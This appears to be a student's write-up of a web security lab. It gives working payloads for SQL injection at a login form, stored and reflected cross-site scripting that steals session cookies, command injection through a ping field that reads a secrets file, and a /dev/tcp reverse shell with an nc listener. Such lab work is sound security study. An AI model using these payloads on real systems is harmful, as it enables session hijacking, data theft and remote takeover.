Part 1: SQL Injection

login as
	user	:	alice@alice.com';--
	password: anything
 
 this will cut the query and execute before it checks for password



 Part 2: Cross-Site Scripting

 **Second order (persistent) attack**
 as each news are a list item, we can use 

    </li> [our actual code] <li>

to inject our code to the news.
In this case we use

<script> document.write("<img src=/news?text="+document.cookie+">") </script>

so that everytime someone sees their news feed, the injected code will print their session into the news feed database.


**first order attack**

instead of an image file that loads automatically, now we have a link that points to the same url

<a href="#" onclick="expose()"> reddit.com/r/funny <script> function expose() { window.location="/news?text="+document.cookie}</script> </a>

putting it in a simple html doesnt work because the cookies are not the same.


**listing secret file**

Using ping input field, we can add an additional shell command by inputting

    localhost && <another command>

in this case, displaying the contents of secret file will need

    localhost && cat secrets

**opening reverse shell**

since we have access to POSIX shell (but not exactly bash), we can setup a reverse shell by doing the following.

1. On our machine, run

    $ nc -l -p 8080 -vvv

2. On "Ping a Host" input field, input

    localhost && echo "exec 5<>/dev/tcp/10.12.72.6/8080; cat <&5 | while read line; do \$line 2>&5 >&5; done" > revshell.sh && chmod +x revshell.sh && bash revshell.sh

  This will create a "revshell.sh" executable file that will redirect its shell to our open port, and then running it on bash. Remember to change "10.12.72.6" in the input to the appropriate ip. The website will hang, and our shell from step 1 will receive a connection. From then, we can access the target's bash by this shell.




